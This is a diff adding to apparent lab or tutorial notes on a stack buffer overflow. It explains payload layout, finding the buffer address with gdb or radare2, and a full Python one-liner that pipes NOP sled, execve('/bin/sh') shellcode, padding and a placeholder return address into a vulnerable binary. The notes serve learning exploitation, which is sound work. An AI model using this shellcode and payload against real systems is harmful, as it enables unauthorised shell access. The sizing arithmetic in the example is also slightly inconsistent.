@@ -623,9 +623,21 @@ text
 |             |             +-- Overwrites saved return address
 |             +---------------- Shellcode to execve("/bin/sh")
 +----------------------------- Many \x90 bytes (NOPs)
+
+Let’s say the buffer is 140 bytes.
+You might structure it like this:
+
+[ NOP sled (30–60 bytes) ]
+[ Shellcode (~30 bytes) ]
+[ Padding / junk (~50 bytes) ]
+[ Overwritten return address (8 bytes) ]
+
+- That totals roughly 140 + 8 bytes (8 is the overflow).
+- The NOP sled doesn’t have to fill the entire buffer — it just needs to be large enough to absorb small address misalignments. 
+- The junk code can be anything and the overwritten part is the address that leads to somewhere in the nop sled that leads to the shell code
+
 So the actual Python payload looks like:
 
-bash
 python -c 'print(
     "\x90" * NOP_COUNT +
     "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" +
@@ -640,3 +652,37 @@ PADDING = bytes to fill up to the saved return address
 
 <return address in little-endian> = an address somewhere in the NOP sled region (e.g. start of buffer)
 
+Where is return address obtained from:
+
+From 'gbd' or 'radare2 -d' 
+\xAA\xBB\xCC\xDD\xEE\xFF\x00\x00
+by finding the runtime address of the buffer inside copy_arg().
+
+That address is not known from the C code.
+It is not printed by the program.
+It is not in the binary.
+
+It is only known at runtime, so you must get it from:
+
+gdb  
+or
+
+radare2 -d
+
+This is how all classic stack‑based shellcode exploits work.
+
+## example:
+
+NOP_COUNT = 60 "\x90" * 60
+PADDING=58bytes -> "A" * 58
+shellcode = 30 bytes
+<return address> = 8 bytes
+
+```
+python -c 'print(
+    "\x90" * 60 +
+    "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" +
+    "A" * 58 +
+    "\xAA\xBB\xCC\xDD\xEE\xFF\x00\x00"  # replace with real little-endian buffer address
+)' | ./buffer-overflow
+```
